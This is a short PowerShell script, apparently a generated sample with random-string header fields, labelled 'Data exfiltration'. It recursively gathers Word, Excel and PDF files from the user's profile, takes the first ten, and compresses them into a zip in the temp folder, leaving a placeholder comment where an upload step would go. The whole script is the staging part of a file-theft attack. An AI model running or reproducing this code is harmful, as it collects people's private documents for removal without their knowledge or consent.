# kDnG7g1yldOqLbFQrYdU
# Generated: 2025-11-03T12:20:52.709342
# System: N8qeeX4Mg2OrOFj
# Process: Ec9GsV09sVY6


# Data exfiltration
$sensitiveFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.doc, *.docx, *.pdf, *.xls, *.xlsx -ErrorAction SilentlyContinue | Select-Object -First 10

if ($sensitiveFiles) {
    $CTjal4noZip = "$env:TEMP\data.zip"
    Compress-Archive -Path $sensitiveFiles.FullName -DestinationPath $CTjal4noZip -Force
    # Upload logic would go here
}
